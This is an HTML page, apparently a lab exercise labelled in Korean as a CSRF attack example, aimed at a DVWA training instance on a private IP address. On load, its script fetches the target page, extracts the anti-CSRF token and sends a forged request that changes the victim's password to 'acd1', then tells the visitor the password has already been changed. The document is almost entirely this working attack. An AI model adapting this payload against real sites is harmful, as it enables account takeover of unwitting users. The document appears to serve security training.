<html>
<meta charset="UTF-8">
<head>
</head>

<script>
  var xhr;
  var host='';
  var dvwa= 'http://192.168.132.128/DVWA/vulnerabilities/csrf/';

  function req1() {
    xhr=new XMLHttpRequest();
    xhr.onreadystatechange=function(){
      if (this.readyState === 4 && this.status === 200) {
        var htmltext = this.responseText;               //변수를 text로 받는다
        var parser = new DOMParser();                   //DOM 객체
        var htmlDOC = parser.parseFromString(htmltext, 'text/html');    //
        var csrftoken = htmlDOC.getElementsByName('user_token')[0].value;
        xhr = new XMLHttpRequest();
        xhr.open('GET', dvwa + '?password_new=acd1&password_conf=acd1&Change=Change&user_token=' + csrftoken);
        xhr.send();
      }
    };
    xhr.open("GET",dvwa,true);
    xhr.send();
  }


</script>

<body>
(CSRF 공격 예제)<br />
이미 비밀번호는 바뀌었습니다.<br />
<script>
  req1();

</script>

